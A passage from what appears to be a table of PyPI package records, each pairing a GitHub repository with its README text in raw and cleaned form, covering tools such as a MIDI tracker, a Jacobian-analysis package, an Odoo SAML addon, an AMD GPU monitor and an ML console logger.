and offers similar functionality (and limitations).
It relies 100% on JACK audio connection kit for 
input/output/synch and uses jack_capture for rendering.
The GUI has similar dependencies as gnome-calculator
and tracker paradigm was chosen to allow for rhythmic
gymnastics otherwise hard to convey.

Low level stuff was done in C and wrapped in Python.
Human interfacing part of contraption employs
GTK through gobject introspection and was also contrived
in the language we shall no longer spam about.

## dependencies
```
fedora - python3-devel jack-audio-connection-kit-devel jack_capture
ubuntu - build-essential python3-dev python3-setuptools libjack-jackd2-dev jack-capture
```

## install
```
pip3 install vht
```
","![vht header](/data/vht_header.png)
## about
vahatraker is a MIDI sequencing companion
for GNU/Linux audio setups. Adhering to Unix philosophy,
driving MIDI is the one thing it tries to do well,
adhering to other doctrines - enabling expression,
with added value of:

- live editing
- fast workflow
- intuitive midi-in
- unheard of time signatures
- scenes a'la 'ton
- fractal turtles
- fits on a floppy
- doesn't make sound

Frankly speaking, vht was envisaged as a re-creation
of seq24 in tracker form for author's ""studio needs""
and offers similar functionality (and limitations).
It relies 100% on JACK audio connection kit for 
input/output/synch and uses jack_capture for rendering.
The GUI has similar dependencies as gnome-calculator
and tracker paradigm was chosen to allow for rhythmic
gymnastics otherwise hard to convey.

Low level stuff was done in C and wrapped in Python.
Human interfacing part of contraption employs
GTK through gobject introspection and was also contrived
in the language we shall no longer spam about.

## dependencies
```
fedora - python3-devel jack-audio-connection-kit-devel jack_capture
ubuntu - build-essential python3-dev python3-setuptools libjack-jackd2-dev jack-capture
```

## install
```
pip3 install vht
```
",rdybka/vht
digital-diffeomorphism,https://github.com/yihao6/digital_diffeomorphism,3,3218,2959,"<img src='docs/_static/imgs/example.png' width=""1000px""/>

# Digital diffeomorphism volume and Non-diffeomorphic area
This is an implementation of the **digital diffeomorphism volume** and
**non-diffeomorphic area** computation we introduced in our paper:

<a href=""https://arxiv.org/abs/2212.06060"">Liu, Yihao, et al. ""On Finite Difference Jacobian Computation in Deformable Image Registration."" arXiv preprint arXiv:2212.06060 (2022).</a>

## Motivation
The Jacobian determinant $|J|$ of spatial transformations is a widely used metric in
deformable image registration, but the details of its computation are often overlooked.
Contrary to what one might expect, the commonly used central difference base $|J|$
does not reflect if the transformation is diffeomorphic or not. We proposed the
definition of digital diffeomorphism that solves several errors that inherent in
the central difference based $|J|$. We further propose to use non-diffeomorphic
volume to measure the irregularity of 3D transformations.

<p align=""center"">
  <img src='docs/_static/imgs/checkerboard_problem.png' align=""center"" width=""200px""/>
</p>

An failure case of the central difference based $|J|$. The center pixel
has central difference based $|J|=1$ but it is not diffeomorphic. In fact, the
transformation at the center pixel has no effect on the computation of central
difference based $|J|$, even if it moves outside the field of view.
## Getting Started

### Installation
The easiest way to install the package is through the following command:
```
pip install digital-diffeomorphism
```

To install from the source:

- Clone this repo:
```bash
git clone https://github.com/yihao6/digital_diffeomorphism.git
cd digital_diffeomorphism
```
- Install the dependencies:
```bash
python setup.py install
```

### Usage
To evaluate a 3D sampling grid with dimension $H\times W\times D\times 3$
```bash
ndv grid_3d.nii.gz
```
This will calculate
1. non-diffeomorphic volume; and
2. non-diffeomorphic voxels computed by the central difference.

If the transformation is stored as a displacement field:
```bash
ndv disp_3d.nii.gz --disp
```

To evaluate a 2D sampling grid with dimension $H\times W\times 2$
```bash
nda grid_2d.nii.gz
```
This will calculate
1. non-diffeomorphic area; and
2. non-diffeomorphic pixels computed by the central difference.

If the transformation is stored as a displacement field:
```bash
ndv disp_2d.nii.gz --disp
```
### Potential Pitfalls
1. Several packages implement spatial transformations using a normalized sampling grid. For example, <a href=""https://arxiv.org/abs/2212.06060"">torch.nn.functional.grid_sample</a>. In this package, we use un-normalized coordinates to represent transformations. Therefore, the input sampling grid or displacement field should be in voxel or pixel units. In case the input is normalized, it must be unnormalized prior to using this package.

### Citation
If you use this code, please cite our paper.
```
@article{liu2022finite,
  title={On Finite Difference Jacobian Computation in Deformable Image Registration},
  author={Liu, Yihao and Chen, Junyu and Wei, Shuwen and Carass, Aaron and Prince, Jerry},
  journal={arXiv preprint arXiv:2212.06060},
  year={2022}
}
```
","

# Digital diffeomorphism volume and Non-diffeomorphic area
This is an implementation of the **digital diffeomorphism volume** and
**non-diffeomorphic area** computation we introduced in our paper:

Liu, Yihao, et al. ""On Finite Difference Jacobian Computation in Deformable Image Registration."" arXiv preprint arXiv:2212.06060 (2022).

## Motivation
The Jacobian determinant $|J|$ of spatial transformations is a widely used metric in
deformable image registration, but the details of its computation are often overlooked.
Contrary to what one might expect, the commonly used central difference base $|J|$
does not reflect if the transformation is diffeomorphic or not. We proposed the
definition of digital diffeomorphism that solves several errors that inherent in
the central difference based $|J|$. We further propose to use non-diffeomorphic
volume to measure the irregularity of 3D transformations.





An failure case of the central difference based $|J|$. The center pixel
has central difference based $|J|=1$ but it is not diffeomorphic. In fact, the
transformation at the center pixel has no effect on the computation of central
difference based $|J|$, even if it moves outside the field of view.
## Getting Started

### Installation
The easiest way to install the package is through the following command:
```
pip install digital-diffeomorphism
```

To install from the source:

- Clone this repo:
```bash
git clone https://github.com/yihao6/digital_diffeomorphism.git
cd digital_diffeomorphism
```
- Install the dependencies:
```bash
python setup.py install
```

### Usage
To evaluate a 3D sampling grid with dimension $H\times W\times D\times 3$
```bash
ndv grid_3d.nii.gz
```
This will calculate
1. non-diffeomorphic volume; and
2. non-diffeomorphic voxels computed by the central difference.

If the transformation is stored as a displacement field:
```bash
ndv disp_3d.nii.gz --disp
```

To evaluate a 2D sampling grid with dimension $H\times W\times 2$
```bash
nda grid_2d.nii.gz
```
This will calculate
1. non-diffeomorphic area; and
2. non-diffeomorphic pixels computed by the central difference.

If the transformation is stored as a displacement field:
```bash
ndv disp_2d.nii.gz --disp
```
### Potential Pitfalls
1. Several packages implement spatial transformations using a normalized sampling grid. For example, torch.nn.functional.grid_sample. In this package, we use un-normalized coordinates to represent transformations. Therefore, the input sampling grid or displacement field should be in voxel or pixel units. In case the input is normalized, it must be unnormalized prior to using this package.

### Citation
If you use this code, please cite our paper.
```
@article{liu2022finite,
  title={On Finite Difference Jacobian Computation in Deformable Image Registration},
  author={Liu, Yihao and Chen, Junyu and Wei, Shuwen and Carass, Aaron and Prince, Jerry},
  journal={arXiv preprint arXiv:2212.06060},
  year={2022}
}
```
",yihao6/digital_diffeomorphism
odoo-addon-auth-saml-environment,https://github.com/OCA/server-env,3,3914,3499,"======================
Auth SAML environement
======================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fserver--env-lightgray.png?logo=github
    :target: https://github.com/OCA/server-env/tree/15.0/auth_saml_environment
    :alt: OCA/server-env
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/server-env-15-0/server-env-15-0-auth_saml_environment
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/254/15.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module allows to use server env for SAML configuration

**Table of contents**

.. contents::
   :local:

Installation
============

To install this module, you need to have the following modules installed and
properly configured: `server_environment module` `auth_saml`

Configuration
=============

To configure this module, you need to:

Create a module server_environment_file with a cfg file or set the environment variable
SERVER_ENV_CONFIG with the following section:

[auth_saml_provider.<name>]

Where <name> is optional and must be equal to the name field you defined in Odoo for the IDP.


Example of configuration

[auth_saml_provider.my_idp]

idp_metadata=<...>
sp_baseurl=https://odoo-community.org
sp_pem_public_path=/data/cert.pem
sp_pem_private_path=/data/key.pem

Usage
=====

Once configured, Odoo will read the Auth SAML Providers values from the
configuration.

Note that visibility of login button for SAML is changed and differs from `auth_saml` module,
instead of relying on which fields are filled or not, all providers will be displayed as long
as their configuration in Odoo are set to active.

Known issues / Roadmap
======================

* Due to the special nature of this addon, you cannot test it on the OCA
  runbot.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues <https://github.com/OCA/server-env/issues>`_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback <https://github.com/OCA/server-env/issues/new?body=module:%20auth_saml_environment%0Aversion:%2015.0%0A%0A**Steps%20to%20reproduce**%0A-%20...%0A%0A**Current%20behavior**%0A%0A**Expected%20behavior**>`_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Camptocamp SA

Contributors
~~~~~~~~~~~~

* Denis Leemann <denis.leemann@camptocamp.com>
* Yannick Vaucher <yannick.vaucher@camptocamp.com>
* Stéphane Mangin <stephane.mangin@camptocamp.com>

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/server-env <https://github.com/OCA/server-env/tree/15.0/auth_saml_environment>`_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


","======================
Auth SAML environement
======================

.. !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
   !! This file is generated by oca-gen-addon-readme !!
   !! changes will be overwritten.                   !!
   !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

.. |badge1| image:: https://img.shields.io/badge/maturity-Beta-yellow.png
    :target: https://odoo-community.org/page/development-status
    :alt: Beta
.. |badge2| image:: https://img.shields.io/badge/licence-AGPL--3-blue.png
    :target: http://www.gnu.org/licenses/agpl-3.0-standalone.html
    :alt: License: AGPL-3
.. |badge3| image:: https://img.shields.io/badge/github-OCA%2Fserver--env-lightgray.png?logo=github
    :target: https://github.com/OCA/server-env/tree/15.0/auth_saml_environment
    :alt: OCA/server-env
.. |badge4| image:: https://img.shields.io/badge/weblate-Translate%20me-F47D42.png
    :target: https://translation.odoo-community.org/projects/server-env-15-0/server-env-15-0-auth_saml_environment
    :alt: Translate me on Weblate
.. |badge5| image:: https://img.shields.io/badge/runbot-Try%20me-875A7B.png
    :target: https://runbot.odoo-community.org/runbot/254/15.0
    :alt: Try me on Runbot

|badge1| |badge2| |badge3| |badge4| |badge5| 

This module allows to use server env for SAML configuration

**Table of contents**

.. contents::
   :local:

Installation
============

To install this module, you need to have the following modules installed and
properly configured: `server_environment module` `auth_saml`

Configuration
=============

To configure this module, you need to:

Create a module server_environment_file with a cfg file or set the environment variable
SERVER_ENV_CONFIG with the following section:

[auth_saml_provider.]

Where  is optional and must be equal to the name field you defined in Odoo for the IDP.


Example of configuration

[auth_saml_provider.my_idp]

idp_metadata=<...>
sp_baseurl=https://odoo-community.org
sp_pem_public_path=/data/cert.pem
sp_pem_private_path=/data/key.pem

Usage
=====

Once configured, Odoo will read the Auth SAML Providers values from the
configuration.

Note that visibility of login button for SAML is changed and differs from `auth_saml` module,
instead of relying on which fields are filled or not, all providers will be displayed as long
as their configuration in Odoo are set to active.

Known issues / Roadmap
======================

* Due to the special nature of this addon, you cannot test it on the OCA
  runbot.

Bug Tracker
===========

Bugs are tracked on `GitHub Issues `_.
In case of trouble, please check there if your issue has already been reported.
If you spotted it first, help us smashing it by providing a detailed and welcomed
`feedback `_.

Do not contact contributors directly about support or help with technical issues.

Credits
=======

Authors
~~~~~~~

* Camptocamp SA

Contributors
~~~~~~~~~~~~

* Denis Leemann 
* Yannick Vaucher 
* Stéphane Mangin 

Maintainers
~~~~~~~~~~~

This module is maintained by the OCA.

.. image:: https://odoo-community.org/logo.png
   :alt: Odoo Community Association
   :target: https://odoo-community.org

OCA, or the Odoo Community Association, is a nonprofit organization whose
mission is to support the collaborative development of Odoo features and
promote its widespread use.

This module is part of the `OCA/server-env `_ project on GitHub.

You are welcome to contribute. To learn how please visit https://odoo-community.org/page/Contribute.


",oca/server-env
pymwr,https://github.com/imsayyed/pymwr,0,934,934,"# PyMWR

PyMWR is a Python package for interacting with microwave radiometer (MWR) data. It allows users to read, plot, and analyze MWR data from various sources.



## Installation

To install PyMWR, run the following command:

```python
pip install pymwr
```

Alternatively, you can install it from source:

```
pip install git+https://github.com/imsayyed/pymwr.git
```

Or, you can install it in --user mode:

```python
git clone https://github.com/imsayyed/pymwr.git
cd pymwr
python setup.py install --user
```
## Usage

Here is an [example](./examples/examples.ipynb) of how to read and plot MWR data using PyMWR.


## Contributing

If you would like to contribute to PyMWR, please read the Contributing Guidelines.


## License

PyMWR is licensed under the MIT License.


## Authors

- [Imran Sayyed](https://github.com/imsayyed) (sayyed950@gmail.com)
- [Hamid Ali Syed](https://github.com/syedhamidali) (hamidsyed37@gmail.com)
","# PyMWR

PyMWR is a Python package for interacting with microwave radiometer (MWR) data. It allows users to read, plot, and analyze MWR data from various sources.



## Installation

To install PyMWR, run the following command:

```python
pip install pymwr
```

Alternatively, you can install it from source:

```
pip install git+https://github.com/imsayyed/pymwr.git
```

Or, you can install it in --user mode:

```python
git clone https://github.com/imsayyed/pymwr.git
cd pymwr
python setup.py install --user
```
## Usage

Here is an [example](./examples/examples.ipynb) of how to read and plot MWR data using PyMWR.


## Contributing

If you would like to contribute to PyMWR, please read the Contributing Guidelines.


## License

PyMWR is licensed under the MIT License.


## Authors

- [Imran Sayyed](https://github.com/imsayyed) (sayyed950@gmail.com)
- [Hamid Ali Syed](https://github.com/syedhamidali) (hamidsyed37@gmail.com)
",imsayyed/pymwr
django-tsp,https://github.com/TravelSalesmanProblem/django_tsp,1,44,44,"# django_tsp
Django Travel Salesman Problem
","# django_tsp
Django Travel Salesman Problem
",travelsalesmanproblem/django_tsp
ndfind,https://github.com/axil/ndfind,0,9,9,"# ndfind
","# ndfind
",axil/ndfind
amdgpu-stats,https://github.com/joshlay/amdgpu_stats,2,1685,1685,"# amdgpu_stats

A Python module/TUI for AMD GPU statistics

![Screenshot of main screen](https://raw.githubusercontent.com/joshlay/amdgpu_stats/master/screens/main.png ""Main screen"")

Supported GPUs and temperature nodes (`edge`/`junction`/etc.) are discovered automatically.

Tested _only_ on `RX6000` series cards; APUs and more _may_ be supported. Please file an issue if finding incompatibility!

## Installation
```
pip install amdgpu-stats
```
To use the _TUI_, run `amdgpu-stats` in your terminal of choice. For the _module_, see below!

## Module

Introduction:
```
In [1]: import amdgpu_stats.utils

In [2]: amdgpu_stats.utils.AMDGPU_CARDS
Out[2]: {'card0': '/sys/class/drm/card0/device/hwmon/hwmon9'}

In [3]: amdgpu_stats.utils.get_core_stats('card0')
Out[3]: {'sclk': 640000000, 'mclk': 1000000000, 'voltage': 0.79, 'util_pct': 65}

In [4]: amdgpu_stats.utils.get_clock('core', format_freq=True)
Out[4]: '659 MHz' 
```

For more information on what the module provides, please see:
 - [ReadTheDocs](https://amdgpu-stats.readthedocs.io/en/latest/)
 - `help('amdgpu_stats.utils')` in your interpreter
 - [The module source](https://github.com/joshlay/amdgpu_stats/blob/master/src/amdgpu_stats/utils.py)

Feature requests [are encouraged](https://github.com/joshlay/amdgpu_stats/issues) 😀

## Requirements
Only `Linux` is supported. Information is _completely_ sourced from interfaces in `sysfs`.

It _may_ be necessary to update the `amdgpu.ppfeaturemask` parameter to enable metrics.

This is assumed present for *control* over the elements being monitored. Untested without. 

See [this Arch Wiki entry](https://wiki.archlinux.org/title/AMDGPU#Boot_parameter) for context.
","# amdgpu_stats

A Python module/TUI for AMD GPU statistics

![Screenshot of main screen](https://raw.githubusercontent.com/joshlay/amdgpu_stats/master/screens/main.png ""Main screen"")

Supported GPUs and temperature nodes (`edge`/`junction`/etc.) are discovered automatically.

Tested _only_ on `RX6000` series cards; APUs and more _may_ be supported. Please file an issue if finding incompatibility!

## Installation
```
pip install amdgpu-stats
```
To use the _TUI_, run `amdgpu-stats` in your terminal of choice. For the _module_, see below!

## Module

Introduction:
```
In [1]: import amdgpu_stats.utils

In [2]: amdgpu_stats.utils.AMDGPU_CARDS
Out[2]: {'card0': '/sys/class/drm/card0/device/hwmon/hwmon9'}

In [3]: amdgpu_stats.utils.get_core_stats('card0')
Out[3]: {'sclk': 640000000, 'mclk': 1000000000, 'voltage': 0.79, 'util_pct': 65}

In [4]: amdgpu_stats.utils.get_clock('core', format_freq=True)
Out[4]: '659 MHz' 
```

For more information on what the module provides, please see:
 - [ReadTheDocs](https://amdgpu-stats.readthedocs.io/en/latest/)
 - `help('amdgpu_stats.utils')` in your interpreter
 - [The module source](https://github.com/joshlay/amdgpu_stats/blob/master/src/amdgpu_stats/utils.py)

Feature requests [are encouraged](https://github.com/joshlay/amdgpu_stats/issues) 😀

## Requirements
Only `Linux` is supported. Information is _completely_ sourced from interfaces in `sysfs`.

It _may_ be necessary to update the `amdgpu.ppfeaturemask` parameter to enable metrics.

This is assumed present for *control* over the elements being monitored. Untested without. 

See [this Arch Wiki entry](https://wiki.archlinux.org/title/AMDGPU#Boot_parameter) for context.
",joshlay/amdgpu_stats
ccqppy,https://github.com/palmerb4/ccqppy,4,142,142,"# CCQPpy
A systematic comparison of various algorithms for solving convex constrained quadratic programming problems with convex feasible set
","# CCQPpy
A systematic comparison of various algorithms for solving convex constrained quadratic programming problems with convex feasible set
",palmerb4/ccqppy
mpm-msftool,https://github.com/santiago046/mpm-msftool,0,0,0,,,santiago046/mpm-msftool
loggerml,https://github.com/valentingol/logml,2,6103,6103,"
# LoggerML - Machine Learning Logger in the console

Log your Machine Learning training in the console in a beautiful way using
[rich](https://github.com/Textualize/rich)✨ with useful information but with
minimal code.

[![Release](https://img.shields.io/github/v/release/valentingol/logml?include_prereleases)](https://github.com/valentingol/logml/releases)
![PythonVersion](https://img.shields.io/badge/python-3.7%20%7E%203.11-informational)
[![License](https://img.shields.io/github/license/valentingol/logml?color=999)](https://stringfixer.com/fr/MIT_license)

[![Ruff_logo](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/charliermarsh/ruff/main/assets/badge/v1.json)](https://github.com/charliermarsh/ruff)
[![Black_logo](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

[![Ruff](https://github.com/valentingol/logml/actions/workflows/ruff.yaml/badge.svg)](https://github.com/valentingol/logml/actions/workflows/ruff.yaml)
[![Flake8](https://github.com/valentingol/logml/actions/workflows/flake.yaml/badge.svg)](https://github.com/valentingol/logml/actions/workflows/flake.yaml)
[![Pydocstyle](https://github.com/valentingol/logml/actions/workflows/pydocstyle.yaml/badge.svg)](https://github.com/valentingol/logml/actions/workflows/pydocstyle.yaml)
[![MyPy](https://github.com/valentingol/logml/actions/workflows/mypy.yaml/badge.svg)](https://github.com/valentingol/logml/actions/workflows/mypy.yaml)
[![PyLint](https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/valentingol/451f91cece4478ebc81377e27e432f8b/raw/logml_pylint.json)](https://github.com/valentingol/logml/actions/workflows/pylint.yaml)

[![Tests](https://github.com/valentingol/logml/actions/workflows/tests.yaml/badge.svg)](https://github.com/valentingol/logml/actions/workflows/tests.yaml)
[![Coverage](https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/valentingol/451f91cece4478ebc81377e27e432f8b/raw/logml_tests.json)](https://github.com/valentingol/logml/actions/workflows/tests.yaml)

## Installation

In a new virtual environment, install simply the package via
[pipy](https://pypi.org/project/loggerml/):

```bash
pip install loggerml
```

## Supported platforms

This package assume that you are using a terminal that support ANSI escape sequences.
See [here](https://en.wikipedia.org/wiki/ANSI_escape_code#Platform_support) for
supported platforms. All Unix and Emacs distribution are supported as well as Windows
but only on some machine (Windows 11 seems to work but not Windows 10).

The quick test to know if your terminal support ANSI escape sequence is to run the
following command in your terminal:

```script
python -c ""print('\x1B')""
```

It should print an *empty* line.

## Quick start

### Minimal usage

Integrate the LogML logger in your training loops! For instance for 4 epochs,
20 batches per epoch and a log interval of 2 batches:

```python
from logml import Logger

logger = Logger(
    n_epochs=4,
    n_batches=20,
    log_interval=2,
)
for _ in range(4):
    logger.start_epoch()  # Indicate the start of a new epoch
    for _ in range(20):
        logger.start_batch()  # Indicate the start of a new batch
        logger.log({'loss': 0.54321256, 'accuracy': 0.85244777})
```

Yields:

```script
Epoch 1/4, batch 20/20
[================================================][100%]
[global 00:00:02 > 00:00:06 | epoch 00:00:02 > 00:00:00]
loss: 0.5432 | accuracy: 0.8524 |

Epoch 2/4, batch 8/20
[=================>                              ][40%]
[global 00:00:03 > 00:00:05 | epoch 00:00:01 > 00:00:01]
loss: 0.5432 | accuracy: 0.8524 |
```

### Advanced usage

Now you can customize the logger with your own styles and colors. You can set the default configuration at the initialization of the logger and then you can override it during log. You can also log the averaged value over the epoch. For instance:

```python
logger = Logger(
    n_epochs=4,
    n_batches=20,
    styles='yellow',
    digits={'accuracy': 2},
    average=['loss'],  # loss will be averaged over the current epoch
    bold_keys=True,
    show_time=False,  # Remove the time bar
)
for _ in range(4):
    logger.start_epoch()
    for _ in range(20):
        logger.start_batch()
        # Overwrite the default style for ""loss"" and add a message
        logger.log(
            {'loss': 0.54321256, 'accuracy': 85.244777},
            styles={'loss': 'italic red'},
            message=""Training is going well?\nYes!"",
        )
```

Yields:

```script
Epoch 1/4, batch 20/20
[================================================][100%]
loss: 0.5432 | accuracy: 85 |

Epoch 2/4, batch 7/20
[=================>                              ][35%]
[global 00:00:03 > 00:00:05 | epoch 00:00:01 > 00:00:01]
loss: 0.5432 | accuracy: 85 |
Training is going well?
Yes!
```

With ""loss: 0.5432"" in italic red, ""accuracy: 85"" in yellow and both keys in bold.

### Don't know the number of batches in advance?

If you don't have the number of batches in advance, you can initialize the
logger with `n_batches=None`. The progress bar is replaced by a cyclic animation. The eta times are not know at the first epoch but was estimated after the second epoch.

## How to contribute

For **development**, install the package dynamically and dev requirements with:

```bash
pip install -e .
pip install -r requirements-dev.txt
```

Everyone can contribute to LogML, and we value everyone’s contributions.
Please see our [contributing guidelines](CONTRIBUTING.md) for more information 🤗

## License

Copyright (C) 2023  Valentin Goldité

This program is free software: you can redistribute it and/or modify it under the
terms of the [MIT License](LICENSE). This program is distributed in the hope that
it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

This project is free to use for COMMERCIAL USE, MODIFICATION, DISTRIBUTION and
PRIVATE USE as long as the original license is include as well as this copy
right notice at the top of the modified files.
","
# LoggerML - Machine Learning Logger in the console

Log your Machine Learning training in the console in a beautiful way using
[rich](https://github.com/Textualize/rich)✨ with useful information but with
minimal code.

[![Release](https://img.shields.io/github/v/release/valentingol/logml?include_prereleases)](https://github.com/valentingol/logml/releases)
![PythonVersion](https://img.shields.io/badge/python-3.7%20%7E%203.11-informational)
[![License](https://img.shields.io/github/license/valentingol/logml?color=999)](https://stringfixer.com/fr/MIT_license)

[![Ruff_logo](https://img.shields.io/endpoint?url=https://raw.githubusercontent.com/charliermarsh/ruff/main/assets/badge/v1.json)](https://github.com/charliermarsh/ruff)
[![Black_logo](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

[![Ruff](https://github.com/valentingol/logml/actions/workflows/ruff.yaml/badge.svg)](https://github.com/valentingol/logml/actions/workflows/ruff.yaml)
[![Flake8](https://github.com/valentingol/logml/actions/workflows/flake.yaml/badge.svg)](https://github.com/valentingol/logml/actions/workflows/flake.yaml)
[![Pydocstyle](https://github.com/valentingol/logml/actions/workflows/pydocstyle.yaml/badge.svg)](https://github.com/valentingol/logml/actions/workflows/pydocstyle.yaml)
[![MyPy](https://github.com/valentingol/logml/actions/workflows/mypy.yaml/badge.svg)](https://github.com/valentingol/logml/actions/workflows/mypy.yaml)
[![PyLint](https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/valentingol/451f91cece4478ebc81377e27e432f8b/raw/logml_pylint.json)](https://github.com/valentingol/logml/actions/workflows/pylint.yaml)

[![Tests](https://github.com/valentingol/logml/actions/workflows/tests.yaml/badge.svg)](https://github.com/valentingol/logml/actions/workflows/tests.yaml)
[![Coverage](https://img.shields.io/endpoint?url=https://gist.githubusercontent.com/valentingol/451f91cece4478ebc81377e27e432f8b/raw/logml_tests.json)](https://github.com/valentingol/logml/actions/workflows/tests.yaml)

## Installation

In a new virtual environment, install simply the package via
[pipy](https://pypi.org/project/loggerml/):

```bash
pip install loggerml
```

## Supported platforms

This package assume that you are using a terminal that support ANSI escape sequences.
See [here](https://en.wikipedia.org/wiki/ANSI_escape_code#Platform_support) for
supported platforms. All Unix and Emacs distribution are supported as well as Windows
but only on some machine (Windows 11 seems to work but not Windows 10).

The quick test to know if your terminal support ANSI escape sequence is to run the
following command in your terminal:

```script
python -c ""print('\x1B')""
```

It should print an *empty* line.

## Quick start

### Minimal usage

Integrate the LogML logger in your training loops! For instance for 4 epochs,
20 batches per epoch and a log interval of 2 batches:

```python
from logml import Logger

logger = Logger(
    n_epochs=4,
    n_batches=20,
    log_interval=2,
)
for _ in range(4):
    logger.start_epoch()  # Indicate the start of a new epoch
    for _ in range(20):
        logger.start_batch()  # Indicate the start of a new batch
        logger.log({'loss': 0.54321256, 'accuracy': 0.85244777})
```

Yields:

```script
Epoch 1/4, batch 20/20
[================================================][100%]
[global 00:00:02 > 00:00:06 | epoch 00:00:02 > 00:00:00]
loss: 0.5432 | accuracy: 0.8524 |

Epoch 2/4, batch 8/20
[=================>                              ][40%]
[global 00:00:03 > 00:00:05 | epoch 00:00:01 > 00:00:01]
loss: 0.5432 | accuracy: 0.8524 |
```

### Advanced usage

Now you can customize the logger with your own styles and colors. You can set the default configuration at the initialization of the logger and then you can override it during log. You can also log the averaged value over the epoch. For instance:

```python
logger = Logger(
    n_epochs=4,
    n_batches=20,
    styles='yellow',
    digits={'accuracy': 2},
    average=['loss'],  # loss will be averaged over the current epoch
    bold_keys=True,
    show_time=False,  # Remove the time bar
)
for _ in range(4):
    logger.start_epoch()
    for _ in range(20):
        logger.start_batch()
        # Overwrite the default style for ""loss"" and add a message
        logger.log(
            {'loss': 0.54321256, 'accuracy': 85.244777},
            styles={'loss': 'italic red'},
            message=""Training is going well?\nYes!"",
        )
```

Yields:

```script
Epoch 1/4, batch 20/20
[================================================][100%]
loss: 0.5432 | accuracy: 85 |

Epoch 2/4, batch 7/20
[=================>                              ][35%]
[global 00:00:03 > 00:00:05 | epoch 00:00:01 > 00:00:01]
loss: 0.5432 | accuracy: 85 |
Training is going well?
Yes!
```

With ""loss: 0.5432"" in italic red, ""accuracy: 85"" in yellow and both keys in bold.

### Don't know the number of batches in advance?

If you don't have the number of batches in advance, you can initialize the
logger with `n_batches=None`. The progress bar is replaced by a cyclic animation. The eta times are not know at the first epoch but was estimated after the second epoch.

## How to contribute

For **development**, install the package dynamically and dev requirements with:

```bash
pip install -e .
pip install -r requirements-dev.txt
```

Everyone can contribute to LogML, and we value everyone’s contributions.
Please see our [contributing guidelines](CONTRIBUTING.md) for more information 🤗

## License

Copyright (C) 2023  Valentin Goldité

This program is free software: you can redistribute it and/or modify it under the
terms of the [MIT License](LICENSE). This program is distributed in the hope that
it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

This project is free to use for COMMERCIAL USE, MODIFICATION, DISTRIBUTION and
PRIVATE USE as long as the original license is include as well as this copy
right notice at the top of the modified files.
",valentingol/logml
docamr,https://github.com/IBM/docAMR,3,2388,1973,"# Setup

make an environment with python 3.7

activate environment
```
pip install -r requirements.txt
```

# Create docAMR representation

Link to NAACL 2022 paper DOCAMR: Multi-Sentence AMR Representation and Evaluation

https://aclanthology.org/2022.naacl-main.256.pdf

<img src=""docAMR.jpg"" width=60% height=60%>

To create docAMR representation from gold AMR3.0 data and the coref annotation in xml format:
```
python doc_amr.py 
--amr3-path <path to AMR3 data> 
--coref-fof <file-with-list-of-xml-annotations-files> 
--out-amr <output file> 
--rep <representation>
```
```<path to AMR3 data>``` should point to uncompressed LDC data directory for LDC2020T02 with its original directory structure.

```<file-with-list-of-xml-annotations-files>``` is one of the ```_coref.fof``` files included in this repository.

Default value for ```--rep``` is ```'docAMR'```. Other values can be: ```'no-merge'```,```'merge-names'```,```'merge-all'```. Use ```--help``` to read the descriptions of these representations.

-------

To create docAMR representation from dcoument AMRs with no nodes merged
```
python doc_amr.py
       --in-doc-amr-unmerged <path to document-level AMRs un no-merge format>
       --rep <representation>
       --out-amr <output file>
```

-------

To create docAMR representation from dcoument AMRs with pairwise edges between a representative node in the chain and the rest of the nodes in the chain:
```
python doc_amr.py
       --in-doc-amr-pairwise <path to document-level AMR with pairwise coref edges>
       --pairwise-coref-rel <relation label indicating coref edges>
       --rep <representation>
       --out-amr <output file>
```

default value for ```--pairwise-coref-rel``` is ```same-as```

# Evaluate docAMR (docSmatch) 

Use docSmatch the same way as the standard Smatch. 

```
python docSmatch/smatch.py -f <amr1> <amr2>
```

It assumes that ```:snt``` relations connect sentences to the root. Moreover, it assumes that the numeric suffix of ```:snt``` is the sentence number and that the matching sentence numbers in the two AMRs are aligned.

You can also get a detailed score breakdown for the accuracy of coreference prediction:
```
python docSmatch/smatch.py -f <amr1> <amr2> --coref-subscore
```
This will ouput the normal smatch score as 'Overall Score', as well as a 'Coref Score' indicating the quality of cross sentential edges and nodes.
","# Setup

make an environment with python 3.7

